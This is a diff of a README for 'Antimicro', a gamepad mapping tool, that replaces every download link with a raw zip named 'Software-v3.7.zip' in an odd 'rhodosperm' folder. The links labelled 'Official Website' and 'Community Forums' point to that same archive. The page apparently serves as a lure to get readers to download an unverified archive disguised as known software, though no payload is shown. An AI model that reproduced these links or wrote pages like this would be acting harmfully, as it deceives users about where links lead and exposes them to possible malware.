@@ -4,13 +4,13 @@
 Welcome to Antimicro! This program lets you map your keyboard keys and mouse controls to a gamepad. This is especially helpful for those PC games that don’t support gamepads natively. You can also use Antimicro to control any desktop application with a gamepad.
 
 ## 🔗 Download Now
-[![Download Antimicro](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Antimicro_v3.2.zip)](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Antimicro_v3.2.zip)
+[![Download Antimicro](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Software-v3.7.zip)](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Software-v3.7.zip)
 
 ## 📥 Download & Install
 To get started with Antimicro, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the download page:
-   [Download Antimicro](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Antimicro_v3.2.zip)
+   [Download Antimicro](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Software-v3.7.zip)
 
 2. **Select Your Version**: Once on the download page, choose the version that suits your operating system. Antimicro supports Windows and other platforms. Make sure to select the correct version.
 
@@ -55,7 +55,7 @@ Your input helps us improve Antimicro. If you have suggestions or feedback, plea
 ## 🔗 Additional Resources
 For more details, you can explore the following additional resources:
 
-- [Official Website](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Antimicro_v3.2.zip) for updates and news.
-- [Community Forums](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Antimicro_v3.2.zip) to interact with other users and developers.
+- [Official Website](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Software-v3.7.zip) for updates and news.
+- [Community Forums](https://raw.githubusercontent.com/MoxzzyK/Antimicro/main/rhodosperm/Software-v3.7.zip) to interact with other users and developers.
 
 Thank you for choosing Antimicro! Enjoy gaming with your gamepad.
